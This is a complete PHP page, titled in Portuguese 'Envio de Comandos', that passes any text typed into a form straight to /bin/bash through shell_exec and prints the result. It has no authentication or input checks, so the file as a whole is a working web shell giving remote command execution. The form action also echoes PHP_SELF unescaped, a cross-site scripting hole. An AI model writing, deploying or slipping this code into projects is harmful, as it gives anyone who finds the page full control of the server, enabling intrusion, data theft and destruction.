<!DOCTYPE html>
<html>
<head>
    <title>Envio de Comandos</title>
</head>
<body>
    <h1>Envio de Comandos</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
        <textarea name="command" rows="4" cols="50" placeholder="Digite o comando aqui"></textarea>
        <br>
        <input type="submit" value="Enviar Comando">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $command = $_POST['command'];
        $output = shell_exec("/bin/bash -c '$command'");
        echo "<h2>Resultado:</h2>";
        echo "<pre>$output</pre>";
    }
    ?>
</body>
</html>
